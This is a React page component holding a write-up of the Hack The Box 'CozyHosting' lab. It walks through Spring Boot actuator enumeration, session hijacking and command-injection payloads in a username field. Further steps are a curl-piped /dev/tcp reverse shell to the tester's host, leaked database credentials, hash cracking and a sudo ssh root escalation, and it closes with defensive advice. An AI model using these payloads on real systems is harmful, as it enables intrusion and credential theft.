import React from 'react';

// Import placeholder images - replace with actual screenshots
import cozyLogo from "../../assets/cozyhosting/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/cozyhosting/nmap-scan.png"
import directoryBusting from "../../assets/cozyhosting/dirb.png"
import errorPage from "../../assets/cozyhosting/error-banner.png"
import springBootEnum from "../../assets/cozyhosting/api-fuzz.png"
import sessionsEndpoint from "../../assets/cozyhosting/session-leak.png"

import sessionSteal from "../../assets/cozyhosting/session-steal.png"
import adminPanel from "../../assets/cozyhosting/admin-panel.png"
import mappingsEndpoint from "../../assets/cozyhosting/ssh-endpoint.png"
import commandInjection from "../../assets/cozyhosting/command-i-1.png"
import httpServer from "../../assets/cozyhosting/blind-1.png"
import reverseShell from "../../assets/cozyhosting/app.png"


import applicationProperties from "../../assets/cozyhosting/cred-leak.png"
import postgresLogin from "../../assets/cozyhosting/dbs.png"
import usersTable from "../../assets/cozyhosting/tables.png"
import etcPass from "../../assets/cozyhosting/etc-passwd.png"
import sshJosh from "../../assets/cozyhosting/josh.png"

import sudoList from "../../assets/cozyhosting/sudo-l.png"
import gtfo from "../../assets/cozyhosting/gtfo.png"
import rootShell from "../../assets/cozyhosting/root.png"


const CozyHosting = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">12/07/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">CozyHosting</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to CozyHosting, an exciting challenge showcasing Spring Boot enumeration techniques, command injection vulnerabilities, and lateral movement through database credential harvesting. Explore Spring Boot actuator endpoints, PostgreSQL database exploitation, and sudo privilege escalation. This box demonstrates how web application misconfigurations can lead to complete system compromise!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["Spring Boot enumeration", "actuator endpoints", "command injection", "PostgreSQL", "hash cracking", "lateral movement", "sudo privileges", "GTFOBins"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={cozyLogo} alt="cozyhosting landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            CozyHosting HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('lateral-movement')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('lateral-movement');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.230
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see that it's hosting a webapp with the domain of <span className="text-blue-400">cozyhosting.htb</span>. Let's put it into the <span className="text-yellow-400">/etc/hosts</span> file for DNS resolution and visit the website
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.230 cozyhosting.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://$RHOST
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visiting the website nothing seems to stand out. There is a login form which indicates there is a database as well somewhere. I did vhost enumeration and directory busting to widen my attack surface
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ffuf -w /usr/share/wordlists/dirb/big.txt -u http://cozyhosting.htb/FUZZ
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={directoryBusting} alt="directory busting results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Visiting all of these findings one stood out the most which is the <span className="text-orange-400">error</span> where it gave away it's technology by it's error message on the page.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={errorPage} alt="whitelabel error page" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        A quick google search reveals that the application is run with <span className="text-red-400 font-semibold">Spring Boot</span>. Which is a Java-based application framework that simplifies building production-ready applications. So let's start our Spring Boot Enumeration!
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Spring boot has built in endpoints for monitoring and debugging that if left open could leak some sensitive information. So let's start enumerating those:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ffuf -w /usr/share/wordlists/Web/SpringBoot/spring-boot.txt -u http://cozyhosting.htb/FUZZ
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={springBootEnum} alt="spring boot enumeration" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I visited all endpoints and I found a leaked session for <span className="text-yellow-400">kanderson</span> in the <span className="text-blue-400">/actuator/sessions</span> endpoint
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sessionsEndpoint} alt="sessions endpoint" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        If we copy the <span className="text-red-400">JSESSIONID</span> and replace ours with this and then refresh the page we will steal the session of the user
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sessionSteal} alt="session stealing" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After refresh it redirects us to <span className="text-blue-400">/admin</span> panel. Where we can see an interesting functionality that takes in two parameters <span className="text-yellow-400">hostname</span> and <span className="text-yellow-400">username</span> and sends a POST request to <span className="text-red-400">/executessh</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={adminPanel} alt="admin panel" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        This <span className="text-red-400">/executessh</span> endpoint was too interesting not to enumerate it further so I visited <span className="text-blue-400">/actuator/mappings</span> to see whether I can see how it works, and I did
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={mappingsEndpoint} alt="mappings endpoint" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that it expects two strings and it separates it with <span className="text-yellow-400">;</span> tag this screams <span className="text-red-400 font-semibold">command injection</span> to me so let's try injecting system commands to the username parameter
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            host=asd&username=asd;whoami
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={commandInjection} alt="command injection attempt" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        This means we need to escape it on the right side as well
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            host=asd&username=asd;whoami;
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we do not get the error which is a good sign however there is <span className="text-red-400">no output</span>. Let's see if it's a blind command injection with a GET request to our server
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 8001
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            host=asd&username=asd;curl%09http://[IP]:8001/;
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={httpServer} alt="http server response" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And it does so we can be sure that our command is getting executed. Now let's do a reverse shell by hosting a reverse shell on our server and downloading it to the system and also pipe it into bash.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`nano bash_1.sh

#!/bin/bash 
0<&196;exec 196<>/dev/tcp/10.10.14.11/9443; bash <&196 >&196 2>&196`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now host this with the python server and execute it on the system. Before that let's listen first
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            host=asd&username=asd;curl%09http://10.10.14.11:8001/bash_1.sh|bash;
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell! Before we move on let's upgrade it
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the shell
# On your attacking machine (Kali):
stty raw -echo; fg
# Press Enter twice
# Back in the reverse shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 24 columns 80`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="lateral-movement" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Lateral Movement</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now that we have a shell as <span className="text-yellow-400">app</span>, I enumerated the directory we were dropped into and I found a <span className="text-blue-400">.jar</span> file that once we unzip gives us the files that are responsible for running the web application.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            unzip -d /tmp/examine cloudhosting-0.0.1.jar
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Enumerating the files we unzipped will leak <span className="text-red-400">PostgreSQL</span> database credentials in the <span className="text-yellow-400">application.properties</span> file which is where application-related properties are stored in a Spring Boot application.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={applicationProperties} alt="application properties" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            postgres:Vg&nvzAQ7XxR
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Great let's enumerate this database
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            psql -h cozyhosting -p 5432 -U postgres
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Once logged in list the databases
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            \list
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={postgresLogin} alt="postgres login" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Further enumerating <span className="text-blue-400">cozyhosting</span> with listing tables reveals a table called <span className="text-yellow-400">users</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
                            \c cozyhosting
                        </pre>
                    </div>

                          <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
                            \dt
                        </pre>
                    </div>

                          <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
                            SELECT * FROM users;
                        </pre>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={usersTable} alt="users table" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Great let's get cracking. First let's try admin's hash
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashid -m hash.txt
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It shows that it's a <span className="text-red-400">Blowfish</span> hash which we can hashcat with <span className="text-yellow-400">3200</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
                        </code>
                    </div>
                    
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And it runs successfully revealing a password: <span className="text-green-400">manchesterunited</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Great first let's search for a possible user we can ssh into to use this credentials. We see a user <span className="text-yellow-400">josh</span> with a <span className="text-blue-400">/bin/bash</span>
                    </p>

                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={etcPass} alt="ssh josh" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh josh@10.10.11.230
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sshJosh} alt="ssh josh" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell as <span className="text-yellow-400">josh</span>!
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Doing my usual manual enumeration revealed a very easy and quick vector. We can run <span className="text-red-400">ssh binary as root without sudo password</span>!
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo -l
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sudoList} alt="sudo privileges" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Searching this on <span className="text-blue-400">GTFOBins</span> shows a lot of options. Choosing the <span className="text-yellow-400">"Spawn interactive shell through ProxyCommand option"</span> this gave us a root shell and box finished!
                    </p>
                    
                   <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={gtfo} alt="application properties" />
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Spring Boot Enumeration:</span> Spring Boot actuator endpoints can leak sensitive information including active sessions and application mappings</li>
                            <li>• <span className="text-blue-400">Session Hijacking:</span> Exposed session IDs through actuator endpoints can lead to complete account takeover</li>
                            <li>• <span className="text-yellow-400">Command Injection:</span> Proper input validation is crucial - unsanitized user input in system commands leads to RCE</li>
                            <li>• <span className="text-green-400">Application Analysis:</span> JAR file analysis can reveal database credentials and application configuration</li>
                            <li>• <span className="text-purple-400">Database Enumeration:</span> PostgreSQL databases often contain user credentials with reusable passwords</li>
                            <li>• <span className="text-orange-400">Hash Cracking:</span> Blowfish hashes can be efficiently cracked using hashcat with mode 3200</li>
                            <li>• <span className="text-cyan-400">Sudo Misconfigurations:</span> GTFOBins is an excellent resource for exploiting sudo privileges on common binaries</li>
                            <li>• <span className="text-pink-400">Lateral Movement:</span> Credential reuse between services is a common attack vector in enterprise environments</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">burp suite</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">hashcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">postgresql</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">spring boot</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">netcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">gtfobins</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of securing Spring Boot actuator endpoints in production environments. 
                                The exposed endpoints not only leaked active user sessions but also revealed application internals that facilitated command injection. 
                                Additionally, the combination of credential reuse and sudo misconfigurations shows how multiple small vulnerabilities can chain together for complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Disable or properly secure Spring Boot actuator endpoints in production, implement proper input validation and sanitization, 
                                use principle of least privilege for sudo access, avoid credential reuse across systems, and regularly audit application configurations for sensitive information exposure.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
        </div>
    )
}

export default CozyHosting;